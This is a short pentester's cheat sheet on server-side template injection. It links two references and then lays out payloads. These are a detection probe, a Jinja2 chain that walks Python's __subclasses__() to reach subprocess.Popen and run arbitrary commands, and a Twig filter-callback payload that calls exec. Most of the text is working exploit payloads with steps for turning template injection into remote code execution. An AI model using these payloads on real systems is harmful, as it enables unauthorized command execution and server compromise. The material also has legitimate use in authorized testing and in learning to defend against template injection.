#### Sometimes when user input is accepted, either intentional or unintentional we get XSS, sometimes this also means we cen get template injection
To determine backend use: https://blog.cobalt.io/a-pentesters-guide-to-server-side-template-injection-ssti-c5e3998eae68

[Report on Template Injection](https://portswigger.net/research/server-side-template-injection)

test with `{{'7'*7}}`

`{{''.__class__.mro()[1].__subclasses__()}}` _you may need to change dict selection of class to get the output of interesting functions_

_once you find it, do a replace all '>' with a newline, so that you can determine which number to specify as subclass_

Check the report carefully, as you can see that the `__` are hidden due to the processing of the data as Markdown in the initial report.
You may need to change the value 1 to get the list of interesting functions. Once you get it, you will need to find one that will give you code execution. You can use the following payload to get access to <class 'subprocess.Popen'>:

`{{''.__class__.mro()[1].__subclasses__()[X]}}`

Where X is the integer you need to find.

Finally, you can call this method using:

`{{''.__class__.mro()[1].__subclasses__()[X](COMMAND)}}`  
`{{''.__class__.mro()[2].__subclasses__()[233](["PATH_TO_BINARY","ARG_1"])}}`

Where:

`X` was found previously.
`COMMAND` is the command you want to run.
Make sure you read the Python documentation for the popen to make sure you have get the right syntax for the command (or add the right option).

**Another injection for code execution**
`{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('uname')}}`
